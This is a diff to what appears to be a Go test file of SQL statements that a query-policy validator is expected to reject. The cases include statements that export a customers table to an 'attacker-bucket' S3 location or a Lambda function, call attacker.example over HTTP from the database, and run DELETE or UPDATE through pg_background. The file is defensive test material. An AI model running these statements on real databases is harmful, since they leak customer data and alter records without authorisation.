@@ -437,6 +437,18 @@ var Rejected = []Case{
 	{`SELECT "NET"."HTTP_GET"('https://attacker.example/')`, "net.http_get"},
 	// [policy] pg_net, a name not on any list.
 	{`SELECT net._encode_url_with_params_array('https://attacker.example/', '{}')`, "net._encode_url_with_params_array"},
+	// [review] RDS aws_s3: runs its SQL string and sends the rows to S3.
+	{`SELECT * FROM aws_s3.query_export_to_s3('SELECT * FROM app.customers', aws_commons.create_s3_uri('attacker-bucket', 'c.csv', 'us-east-1'))`, "aws_s3.query_export_to_s3"},
+	// [policy] RDS aws_s3: loads an S3 file into a table.
+	{`SELECT aws_s3.table_import_from_s3('app.orders', '', '(format csv)', 'bucket', 'o.csv', 'us-east-1')`, "aws_s3.table_import_from_s3"},
+	// [review] RDS aws_lambda: sends rows to a Lambda function, in any account.
+	{`SELECT * FROM aws_lambda.invoke('arn:aws:lambda:us-east-1:000000000000:function:f', (SELECT json_agg(c) FROM app.customers c))`, "aws_lambda.invoke"},
+	// [policy] aws_lambda, quoted upper case.
+	{`SELECT "AWS_LAMBDA"."INVOKE"('f', '{}'::json)`, "aws_lambda.invoke"},
+	// [review] pg_background runs its SQL string in a transaction of its own.
+	{`SELECT pg_background_launch('DELETE FROM app.orders')`, "pg_background_launch"},
+	// [review] And returns that statement's result.
+	{`SELECT * FROM pg_background_result(pg_background_launch('UPDATE app.orders SET status = ''paid''')) AS (r text)`, "pg_background_result"},
 	// [policy] pgsql-http, in any schema.
 	{`SELECT http(('GET', 'https://attacker.example/', NULL, NULL, NULL)::http_request)`, "function http "},
 	// [policy] pgsql-http.
